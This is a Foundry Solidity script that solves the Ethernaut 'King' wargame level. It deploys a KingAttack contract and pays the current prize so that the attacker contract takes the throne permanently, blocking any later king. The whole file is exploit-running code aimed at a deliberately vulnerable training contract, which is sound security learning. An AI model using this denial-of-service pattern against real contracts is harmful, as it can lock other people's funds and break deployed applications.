// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IKing} from "../src/interfaces/IKing.sol";
import {KingAttack} from "../src/attackers/KingAttack.sol";

contract KingScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IKing target = IKing(instance);

        uint256 currentPrize = target.prize();
        address currentKing = target._king();

        console2.log("--- King Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Current King   :", currentKing);
        console2.log("Current Prize  :", currentPrize);

        vm.startBroadcast(privateKey);

        // 1. Deploy the attacker contract
        KingAttack attackerContract = new KingAttack();
        console2.log("Deployed KingAttack at:", address(attackerContract));

        // 2. Seize the throne by paying the current prize
        attackerContract.attack{value: currentPrize}(payable(instance));

        vm.stopBroadcast();

        console2.log("New King       :", target._king());
        require(target._king() == address(attackerContract), "Exploit failed: KingAttack is not king");
        console2.log(">>> SUCCESS! KingAttack is now King forever! Submit instance in Ethernaut. <<<");
    }
}
